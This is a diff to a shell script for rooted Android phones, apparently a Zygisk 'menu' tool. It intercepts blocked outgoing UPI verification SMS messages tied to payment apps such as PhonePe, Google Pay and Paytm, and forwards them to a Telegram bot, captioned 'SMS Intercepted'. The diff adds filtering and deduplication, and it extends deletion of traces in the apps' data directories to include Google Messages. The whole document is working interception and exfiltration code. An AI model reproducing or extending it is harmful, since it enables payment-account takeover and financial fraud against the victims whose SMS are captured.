@@ -722,6 +722,42 @@ forward_blocked_telegram() {
   read_blocked_sms
   [ -z "$BLOCKED_BODY" ] && [ -z "$BLOCKED_DEST" ] && return 0
   [ -z "$BLOCKED_BODY" ] && return 0
+
+  # ONLY outgoing UPI verify — never incoming OTP / package name / junk
+  case "$BLOCKED_BODY" in
+    *is\ your\ OTP*|*Valid\ for*|"<#>"*|*"Do not share with anyone"*|*UPI\ Registration*)
+      echo "tg_skip_incoming_otp $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
+      rm -f /data/local/tmp/hivirtus_outgoing_blocked.flag \
+            /data/local/tmp/hivirtus_outgoing_blocked.json \
+            /data/local/tmp/hivirtus_pending_verify.json 2>/dev/null
+      return 0
+      ;;
+  esac
+  echo "$BLOCKED_BODY" | grep -qiE 'HEROAXISUPI|HEROAXIS|DO NOT COPY FORWARD|UNDER ANY CIRCUMSTANCE|YESPROUPI' \
+    || {
+      echo "tg_skip_not_outgoing $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
+      return 0
+    }
+  # To must be digits (verify shortcode / number)
+  TO_DIGITS=$(printf '%s' "$BLOCKED_DEST" | tr -cd '0-9')
+  [ ${#TO_DIGITS} -ge 4 ] && [ ${#TO_DIGITS} -le 15 ] || {
+    echo "tg_skip_bad_dest $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
+    return 0
+  }
+  BLOCKED_DEST="$TO_DIGITS"
+
+  # Dedupe — same To+body only once
+  DKEY=$(printf '%s|%s' "$BLOCKED_DEST" "$BLOCKED_BODY" | md5sum 2>/dev/null | awk '{print $1}')
+  [ -z "$DKEY" ] && DKEY=$(printf '%s|%s' "$BLOCKED_DEST" "$BLOCKED_BODY")
+  PREV=$(cat /data/local/tmp/hivirtus_tg_out_dedupe.hash 2>/dev/null | tr -d '\r\n')
+  if [ -n "$DKEY" ] && [ "$DKEY" = "$PREV" ]; then
+    echo "tg_dedupe_skip $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
+    rm -f /data/local/tmp/hivirtus_outgoing_blocked.flag \
+          /data/local/tmp/hivirtus_outgoing_blocked.json \
+          /data/local/tmp/hivirtus_pending_verify.json 2>/dev/null
+    return 0
+  fi
+
   # Skip if in-process Gamex/SMSTweaks HTTPS already delivered same intercept
   if [ -f /data/local/tmp/hivirtus_tg_inproc_sent.flag ]; then
     IN_DEST=$(head -n1 /data/local/tmp/hivirtus_tg_inproc_sent.flag 2>/dev/null | tr -d '\r')
@@ -745,7 +781,7 @@ forward_blocked_telegram() {
   ONE_TAP="To: ${TO_NUM}
 Message: ${MSG_BODY}"
 
-  # Exact Virtus format (user screenshot)
+  # Exact Virtus format — NO pkg name in message
   TEXT="📱 SMS Intercepted Zygisk Mode
 Menu By @Hivirtus 🔥
 -----------------
@@ -767,15 +803,16 @@ ${ONE_TAP}"
   SENT=0
   RESP="/data/local/tmp/hivirtus_tg_last_response.txt"
   if tg_http_post "$PAYLOAD" "$RESP"; then SENT=1; fi
-  # curl may return HTTP 200 with ok:false — verify
   if [ "$SENT" = "1" ] && grep -q '"ok"[[:space:]]*:[[:space:]]*true' "$RESP" 2>/dev/null; then
+    printf '%s\n' "$DKEY" > /data/local/tmp/hivirtus_tg_out_dedupe.hash 2>/dev/null
+    chmod 666 /data/local/tmp/hivirtus_tg_out_dedupe.hash 2>/dev/null
     rm -f /data/local/tmp/hivirtus_outgoing_blocked.flag
     rm -f /data/local/tmp/hivirtus_outgoing_blocked.json
     rm -f /data/local/tmp/hivirtus_pending_verify.json
     rm -f "$PAYLOAD"
-    # Also clear app code_cache copies so harvest doesn't re-forward
     for pkg in com.herofincorp.diyjourneys com.phonepe.app \
-               com.google.android.apps.nbu.paisa.user net.one97.paytm; do
+               com.google.android.apps.nbu.paisa.user net.one97.paytm \
+               com.google.android.apps.messaging; do
       rm -f "/data/user/0/$pkg/code_cache/hivirtus/hivirtus_outgoing_blocked.json" \
             "/data/user/0/$pkg/code_cache/hivirtus/hivirtus_outgoing_blocked.flag" \
             "/data/data/$pkg/code_cache/hivirtus/hivirtus_outgoing_blocked.json" \
